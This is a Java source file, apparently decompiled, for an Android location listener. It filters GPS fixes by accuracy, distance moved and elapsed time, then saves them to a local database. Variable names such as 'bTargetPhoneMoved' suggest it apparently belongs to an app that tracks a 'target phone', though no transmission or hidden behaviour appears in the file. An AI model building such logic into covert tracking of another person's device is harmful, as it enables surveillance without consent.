package iits.service;

import android.content.Context;
import android.location.Location;
import android.location.LocationListener;
import android.os.Bundle;
import iits.code.bus.GPS_BUS;
import iits.code.dto.GPS_DTO;
import iits.mamager.FileManager;
import java.util.Date;

public class GPSListener implements LocationListener {
    private static final String TAG = "GPSListener";
    private long beforeTime = 0;
    private Context context;
    private boolean flagRootSaved = false;
    private Location gJustComeLocation = null;
    private Location gLastSavedLocation = null;
    private int horizontal;
    private long minTime;
    private int vertical;

    public GPSListener(Context context2, long minTime2, int vertical2, int horizontal2) {
        this.context = context2;
        this.vertical = vertical2;
        this.horizontal = horizontal2;
        this.minTime = minTime2;
    }

    public void setContext(Context context2) {
        this.context = context2;
    }

    public Context getContext() {
        return this.context;
    }

    public void setVertical(int vertical2) {
        this.vertical = vertical2;
    }

    public int getVertical() {
        return this.vertical;
    }

    public void setHorizontal(int horizontal2) {
        this.horizontal = horizontal2;
    }

    public int getHorizontal() {
        return this.horizontal;
    }

    public void setgLastSavedLocation(Location gLastSavedLocation2) {
        this.gLastSavedLocation = gLastSavedLocation2;
    }

    public Location getgLastSavedLocation() {
        return this.gLastSavedLocation;
    }

    public void setgJustComeLocation(Location gJustComeLocation2) {
        this.gJustComeLocation = gJustComeLocation2;
    }

    public Location getgJustComeLocation() {
        return this.gJustComeLocation;
    }

    public void setMinTime(long minTime2) {
        this.minTime = minTime2;
    }

    public long getMinTime() {
        return this.minTime;
    }

    public void setBeforeTime(long beforeTime2) {
        this.beforeTime = beforeTime2;
    }

    public long getBeforeTime() {
        return this.beforeTime;
    }

    public void onLocationChanged(Location loc) {
        boolean bCaptureLocation;
        GPS_DTO aGPS;
        if (this.gLastSavedLocation == null && (aGPS = GPS_BUS.getLastGPS(getContext())) != null) {
            this.gLastSavedLocation = new Location(loc);
            this.gLastSavedLocation.setTime(aGPS.getTime());
            this.gLastSavedLocation.setAccuracy(0.0f);
            this.gLastSavedLocation.setAltitude(Double.parseDouble(aGPS.getAltitude()));
            this.gLastSavedLocation.setLatitude(Double.parseDouble(aGPS.getLatitude()));
            this.gLastSavedLocation.setLongitude(Double.parseDouble(aGPS.getLongitude()));
            this.beforeTime = aGPS.getTime();
            this.flagRootSaved = true;
        }
        if (Math.abs(this.beforeTime - loc.getTime()) < getMinTime()) {
            bCaptureLocation = false;
        } else {
            bCaptureLocation = true;
        }
        if (bCaptureLocation) {
            captureLocation(loc);
        }
    }

    public void onProviderDisabled(String provider) {
    }

    public void onProviderEnabled(String provider) {
    }

    public void onStatusChanged(String provider, int status, Bundle extras) {
    }

    public GPS_DTO convertLocationToDTO(Location loc) {
        if (loc == null) {
            return null;
        }
        GPS_DTO gps = new GPS_DTO();
        gps.setTime(loc.getTime());
        gps.setLatitude(String.valueOf(loc.getLatitude()));
        gps.setLongitude(String.valueOf(loc.getLongitude()));
        gps.setAltitude(String.valueOf(loc.getAltitude()));
        return gps;
    }

    public void captureLocation(Location theBestLocation) {
        boolean bAcceptedToSaveThisPosistion;
        if (theBestLocation != null) {
            try {
                if (theBestLocation.getAccuracy() > 500.0f) {
                    FileManager.WriteLog(1, TAG, "The best location still has not enough accuracy ");
                    return;
                }
                int accuracyUserDefined = getHorizontal();
                long kGPSInterval = getMinTime();
                if (kGPSInterval < 0) {
                    kGPSInterval = 5;
                }
                if (this.gLastSavedLocation != null) {
                    boolean bTargetPhoneMoved = false;
                    if (this.gLastSavedLocation.distanceTo(theBestLocation) >= ((float) accuracyUserDefined)) {
                        bTargetPhoneMoved = true;
                    }
                    if (!bTargetPhoneMoved) {
                        bAcceptedToSaveThisPosistion = false;
                    } else {
                        bAcceptedToSaveThisPosistion = true;
                    }
                    if (1 != 0) {
                        if (!bTargetPhoneMoved) {
                            bAcceptedToSaveThisPosistion = false;
                        } else if (this.gJustComeLocation != null) {
                            boolean bTartgetPhoneStayed = false;
                            if (getgJustComeLocation().distanceTo(theBestLocation) < ((float) accuracyUserDefined)) {
                                bTartgetPhoneStayed = true;
                            }
                            if (!bTartgetPhoneStayed) {
                                bAcceptedToSaveThisPosistion = false;
                                this.gJustComeLocation = theBestLocation;
                            } else if (Math.abs(theBestLocation.getTime() - getgJustComeLocation().getTime()) < kGPSInterval) {
                                bAcceptedToSaveThisPosistion = false;
                            } else {
                                bAcceptedToSaveThisPosistion = true;
                                setgJustComeLocation(null);
                            }
                        } else {
                            this.gJustComeLocation = theBestLocation;
                            bAcceptedToSaveThisPosistion = false;
                        }
                    }
                    Date day = new Date(this.gLastSavedLocation.getTime());
                    Date dayToDay = new Date();
                    if (!(day.getYear() == dayToDay.getYear() && day.getMonth() == dayToDay.getMonth() && day.getDay() == dayToDay.getDay())) {
                        bAcceptedToSaveThisPosistion = true;
                    }
                } else {
                    bAcceptedToSaveThisPosistion = true;
                }
                if (bAcceptedToSaveThisPosistion) {
                    GPS_DTO aGPS = convertLocationToDTO(theBestLocation);
                    this.gLastSavedLocation = theBestLocation;
                    this.gJustComeLocation = null;
                    GPS_BUS.insert(getContext(), aGPS);
                    return;
                }
                FileManager.WriteLog(1, TAG, "Not OK to save GPS data");
            } catch (Exception e) {
                FileManager.WriteLog(3, TAG, "Error on onLocationChanged function: " + e.toString());
            }
        }
    }

    public void captureLocation1(Location location) {
        if (location != null) {
            try {
                if (location.getAccuracy() <= 500.0f) {
                    if (this.gLastSavedLocation == null) {
                        this.gLastSavedLocation = location;
                        GPS_BUS.insert(this.context, convertLocationToDTO(this.gLastSavedLocation));
                        this.flagRootSaved = true;
                    } else if (checkNewDay(new Date(this.gLastSavedLocation.getTime()), new Date(location.getTime()))) {
                        FileManager.WriteLog(1, TAG, "new day");
                        this.gLastSavedLocation = location;
                        GPS_BUS.insert(this.context, convertLocationToDTO(this.gLastSavedLocation));
                        this.flagRootSaved = true;
                    } else if (Math.abs(location.getTime() - this.gLastSavedLocation.getTime()) >= this.minTime * 2) {
                        if (location.distanceTo(this.gLastSavedLocation) > ((float) this.horizontal)) {
                            if (!this.flagRootSaved) {
                                GPS_BUS.insert(this.context, convertLocationToDTO(this.gLastSavedLocation));
                            }
                            this.gLastSavedLocation = location;
                            this.flagRootSaved = false;
                        } else if (!this.flagRootSaved) {
                            GPS_BUS.insert(this.context, convertLocationToDTO(this.gLastSavedLocation));
                            this.flagRootSaved = true;
                        }
                    } else if (location.distanceTo(this.gLastSavedLocation) > ((float) this.horizontal)) {
                        this.gLastSavedLocation = location;
                        this.flagRootSaved = false;
                    }
                }
            } catch (Exception e) {
                FileManager.WriteLog(3, TAG, "Error on onLocationChanged function: " + e.toString());
            }
        }
    }

    public boolean checkNewDay(Date date1, Date date2) {
        if (date1.getYear() == date2.getYear() && date1.getMonth() == date2.getMonth() && date1.getDay() == date2.getDay()) {
            return false;
        }
        return true;
    }
}
